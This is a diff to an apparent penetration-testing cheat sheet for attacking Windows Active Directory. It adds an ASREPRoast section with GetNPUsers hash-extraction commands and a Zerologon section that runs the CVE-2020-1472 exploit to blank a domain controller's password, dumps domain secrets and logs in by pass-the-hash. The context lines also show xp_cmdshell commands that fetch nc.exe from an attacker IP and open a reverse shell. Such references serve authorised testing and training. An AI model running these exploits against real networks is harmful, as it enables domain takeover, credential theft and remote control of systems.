@@ -123,13 +123,6 @@ kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt 
 crackmapexec smb <target ip> -u <username> -p <password> --users
 ```
 
-[GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
-
-```shell
-python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -usersfile <userlist> -format hashcat -outputfile <hashes>
-python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -format hashcat -outputfile <hashes>
-```
-
 change password (STATUS_PASSWORD_MUST_CHANGE)
 
 ```shell
@@ -392,7 +385,9 @@ rpcclient $> lookupdomain <domain_name>
 # Domain info (include SID)
 rpcclient $> querydispinfo
 # Query display info (include RID)
-rpcclient $> queryuser <RID> or <username> 
+rpcclient $> queryuser <RID> or <username>
+# Query domain user group 
+rpcclient $> queryusergroups <RID>
 # Enumerate domain users (include RID)
 rpcclient $> enumdomusers
 # Enumerate domain groups
@@ -518,6 +513,18 @@ python3 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <domain controller 
 hashcat -a 0 -m 13100 <hashfile> ~/Documents/rockyou.txt       
 ```
 
+### :open_file_folder: ASREPRoast
+
+[GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
+
+```shell
+python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -usersfile <userlist> -format hashcat -outputfile <hashes> -no-pass
+# directly output
+python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -usersfile <userlist> -format hashcat -no-pass
+python3 GetNPUsers.py <domain>/ -dc-ip <domain controller ip> -format hashcat -outputfile <hashes>
+# hashcat -> 18200
+```
+
 ### :open_file_folder: [impacket smbclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py)
 
 different from the smb tool smbclient
@@ -633,6 +640,22 @@ proxychains evil-winrm -i '<host>' -u '<username>'
 enable_xp_cmdshell
 xp_cmdshell "powershell.exe wget http://<attacker ip>/nc.exe -OutFile c:\\Users\Public\\nc.exe"
 xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe <attacker ip> <attacker port>"
+```
+
+### :open_file_folder: Zerologon
+
+https://github.com/VoidSec/CVE-2020-1472
+
+```shell
+./cve-2020-1472-exploit.py -n <domain controller> -t <dc-ip>
+# [+] Success: Target is vulnerable!                                                                                                         
+# [-] Do you want to continue and exploit the Zerologon vulnerability? [N]/y 
+# y
+# [+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.
+python secretsdump.py -no-pass -just-dc <domain>/'DC_NETBIOS_NAME$'@<dc-ip>
+# e.g., python secretsdump.py -no-pass -just-dc test.local/'USER01$'@10.10.10.168
+# remote login
+evil-winrm -i <dc-ip> -u <username> -H '<hash>' 
 ```
 
 ### :open_file_folder: Test Environment
